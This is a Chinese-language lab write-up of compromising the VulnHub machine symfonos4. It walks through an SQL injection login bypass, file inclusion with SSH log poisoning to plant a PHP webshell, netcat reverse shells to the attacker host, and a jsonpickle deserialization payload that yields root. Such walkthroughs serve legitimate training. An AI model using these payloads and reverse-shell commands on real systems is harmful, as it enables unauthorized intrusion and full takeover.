+++
date = '2026-10-23T17:07:19+08:00'
draft = false
title = '[VulnHub靶机]symfonos4渗透记录'
tags = ['渗透','Vulnhub','jsonpickle','LFI']
+++

## 信息收集

攻击机IP: 192.168.10.51
使用arp-scan发现靶机IP(192.168.10.120)

```shell
┌──(root㉿kali)-[/home/kali/symfonos4]
└─# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:5f:ca:d5, IPv4: 192.168.10.51
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.10.120  08:00:27:43:e4:22       PCS Systemtechnik GmbH
192.168.10.202  d0:65:78:4c:15:bc       (Unknown)
192.168.10.223  66:60:15:aa:44:28       (Unknown: locally administered)

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.955 seconds (130.95 hosts/sec). 3 responded
```

全端口扫描

```shell
┌──(root㉿kali)-[/home/kali/symfonos4]
└─# nmap --min-rate 10000 -p- 192.168.10.120     
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-23 17:23 +0800
Nmap scan report for 192.168.10.120
Host is up (0.00043s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:43:E4:22 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.93 seconds
```

对发现的两个端口进行深度扫描

```shell
┌──(root㉿kali)-[/home/kali/symfonos4]
└─# nmap -sT -sV -sC -p22,80 192.168.10.120    
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-23 17:24 +0800
Nmap scan report for 192.168.10.120
Host is up (0.00047s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
| ssh-hostkey: 
|   2048 f9:c1:73:95:a4:17:df:f6:ed:5c:8e:8a:c8:05:f9:8f (RSA)
|   256 be:c1:fd:f1:33:64:39:9a:68:35:64:f9:bd:27:ec:01 (ECDSA)
|_  256 66:f7:6a:e8:ed:d5:1d:2d:36:32:64:39:38:4f:9c:8a (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:43:E4:22 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.13 seconds
```

访问Web服务, 是一张图片

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/symfonos4/%E8%AE%BF%E9%97%AEWeb%E6%9C%8D%E5%8A%A1.avif)

进行目录爆破

```shell
┌──(root㉿kali)-[/home/kali/symfonos4]
└─# dirsearch -u http://192.168.10.120/ -i 200
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/symfonos4/reports/http_192.168.10.120/__26-10-23_17-26-51.txt

Target: http://192.168.10.120/

[17:26:51] Starting: 
[17:27:02] 200 -  461B  - /js/
[17:27:04] 200 -  201B  - /manual/index.html
```

发现/js/目录可以访问, 里面是bootstrap.min.js

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/symfonos4/js%E7%9B%AE%E5%BD%95%E5%8F%AF%E8%AE%BF%E9%97%AE.avif)

使用gobuster重新爆破, 发现atlantis.php(不知道为什么同一个字典dirsearch却扫不到)

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/symfonos4/%E5%8F%91%E7%8E%B0atlantis.avif)

访问发现是个登录框

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/symfonos4/%E8%AE%BF%E9%97%AEatlantis.avif)

## 漏洞利用

输入`admin' or '1'='1`发现可以直接登录, 里面是一个列表

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/symfonos4/%E7%99%BB%E5%BD%95%E6%88%90%E5%8A%9F.avif)

选择一个神, 会出现它的介绍, 注意到URL中存在file参数

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/symfonos4/god%E4%BB%8B%E7%BB%8D.avif)

尝试文件包含ssh日志, 服务器成功返回结果  
http://192.168.10.120/sea.php?file=../../../../../var/log/auth

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/symfonos4/ssh%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB.avif)

对ssh日志投毒, 将恶意php代码作为用户名, 登录靶机  
然而新版OpenSSH不允许使用特殊符号作为用户名, 所以使用MSF的ssh_login模块登录

```shell
msf auxiliary(scanner/ssh/ssh_login) > set rhosts 192.168.10.120
rhosts => 192.168.10.120
msf auxiliary(scanner/ssh/ssh_login) > set USERNAME <?php system($_GET[cmd]);?>
USERNAME => <?php system($_GET[cmd]);?>
msf auxiliary(scanner/ssh/ssh_login) > set PASSWORD 123456
PASSWORD => 123456
```

运行后, 即可完成投毒, 访问http://192.168.10.120/sea.php?file=../../../../../var/log/auth&cmd=whoami ,发现服务器返回了用户名www-data, 说明命令被成功执行

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/symfonos4/%E6%88%90%E5%8A%9F%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4.avif)

攻击机用nc监听4444端口, 访问http://192.168.10.120/sea.php?file=../../../../../var/log/auth&cmd=nc%20192.168.10.51%204444%20-e%20/bin/bash, 即可反弹shell

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/symfonos4/%E5%8F%8D%E5%BC%B9shell.avif)

## 权限提升

使用ss查看靶机监听端口, 发现本地8080端口运行着一个服务

```shell
www-data@symfonos4:/var/www/html$ ss -tlnp
ss -tlnp
State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    
LISTEN    0         80               127.0.0.1:3306             0.0.0.0:*       
LISTEN    0         128              127.0.0.1:8080             0.0.0.0:*       
LISTEN    0         128                0.0.0.0:22               0.0.0.0:*       
LISTEN    0         128                      *:80                     *:*       
LISTEN    0         128                   [::]:22                  [::]:*
```

由于没有账户, 我们没办法使用ssh隧道转发流量, 但可以使用socat实现类似的功能

```shell
socat tcp-listen:7000,reuseaddr,fork tcp:localhost:8080
```

命令解释:

| 参数 | 解释 |
| ---- | ---- |
| tcp-listen:7000 | 在TCP7000端口上监听, 等待客户机连接 |
| reuseaddr | 设置 SO_REUSEADDR 套接字选项。允许端口在 TIME_WAIT 状态时被重新绑定，避免"Address already in use"错误，方便程序重启 |
| fork | 每来一个客户端连接，就 fork 出一个子进程独立处理。这样 7000 端口可以同时服务多个客户端；如果不加 fork，socat 处理完一个连接就退出，只能串行 |
| tcp:localhost:8080 | 使用tcp协议连接到本地的8080端口 |

该命令将访问本机tcp7000端口的流量转发到本地的8080端口, 这样我们从攻击机访问靶机的7000端口, 就可以访问靶机本地8080端口的服务

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/symfonos4/%E5%8F%91%E7%8E%B0base64%E7%BC%96%E7%A0%81cookie.avif)

注意到cookie中username字段是一串base64字符串, 对其解码, 发现是个python对象, 其中"py/object": "app.User"代表使用了jsonpickle序列化库

```shell
┌──(root㉿kali)-[/home/kali/symfonos4]
└─# echo 'eyJweS9vYmplY3QiOiAiYXBwLlVzZXIiLCAidXNlcm5hbWUiOiAiUG9zZWlkb24ifQ==' | base64 -d
{"py/object": "app.User", "username": "Poseidon"}
```

使用反序列化漏洞payload

```json
{"py/object": "__main__.Shell", "py/reduce": [{"py/type": "os.system"}, {"py/tuple": ["nc -e /bin/bash 192.168.5.11 4455"]}, null, null, null]}
```

编码成base64, 攻击机监听5555端口, 并将payload放入cookie发送给服务器

```shell
┌──(root㉿kali)-[/home/kali/symfonos4]
└─# echo '{"py/object": "__main__.Shell", "py/reduce": [{"py/type": "os.system"}, {"py/tuple": ["nc -e /bin/bash 192.168.10.51 5555"]}, null, null, null]}' | base64
eyJweS9vYmplY3QiOiAiX19tYWluX18uU2hlbGwiLCAicHkvcmVkdWNlIjogW3sicHkvdHlwZSI6
ICJvcy5zeXN0ZW0ifSwgeyJweS90dXBsZSI6IFsibmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMTAu
NTEgNTU1NSJdfSwgbnVsbCwgbnVsbCwgbnVsbF19Cg==
┌──(root㉿kali)-[/home/kali/symfonos4]
└─# curl http://192.168.10.120:7000/whoami -v -b 'PHPSESSID=sddr3paoj4qlis331h1fhiffc7; username=eyJweS9vYmplY3QiOiAiX19tYWluX18uU2hlbGwiLCAicHkvcmVkdWNlIjogW3sicHkvdHlwZSI6ICJvcy5zeXN0ZW0ifSwgeyJweS90dXBsZSI6IFsibmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMTAuNTEgNTU1NSJdfSwgbnVsbCwgbnVsbCwgbnVsbF19Cg=='
```

获得反弹shell, root权限

```shell
┌──(kali㉿kali)-[~/symfonos4]
└─$ rlwrap nc -lvnp 5555
listening on [any] 5555 ...
connect to [192.168.10.51] from (UNKNOWN) [192.168.10.120] 42714
whoami
root
cd /root
ls
proof.txt
cat proof.txt

        Congrats on rooting symfonos:4!
 ~         ~            ~     w   W   w
                    ~          \  |  /       ~
        ~        ~        ~     \.|./    ~
                                  |
                       ~       ~  |           ~
       o        ~   .:.:.:.       | ~
  ~                 wwWWWww      //   ~
            ((c     ))"""((     //|        ~
   o       /\/\((  (( 6 6 ))   // |  ~
          (d d  ((  )))^(((   //  |
     o    /   / c((-(((')))-.//   |     ~
         /===/ `) (( )))(( ,_/    |~
  ~     /o o/  / c((( (()) |      |  ~          ~
     ~  `~`^  / c (((  ))  |      |          ~
             /c  c(((  (   |  ~   |      ~
      ~     /  c  (((  .   |      |   ~           ~
           / c   c ((^^^^^^`\   ~ | ~        ~
          |c  c c  c((^^^ ^^^`\   |
  ~        \ c   c   c(^^^^^^^^`\ |    ~
       ~    `\ c   c  c;`\^^^^^./ |             ~
              `\c c  c  ;/^^^^^/  |  ~
   ~        ~   `\ c  c /^^^^/' ~ |       ~
         ~        `;c   |^^/'     o
             .-.  ,' c c//^\\         ~
     ~      ( @ `.`c  -///^\\\  ~             ~
             \ -` c__/|/     \|
      ~       `---'   '   ~   '          ~
 ~          ~          ~           ~             ~
        Contact me via Twitter @zayotic to give feedback!
```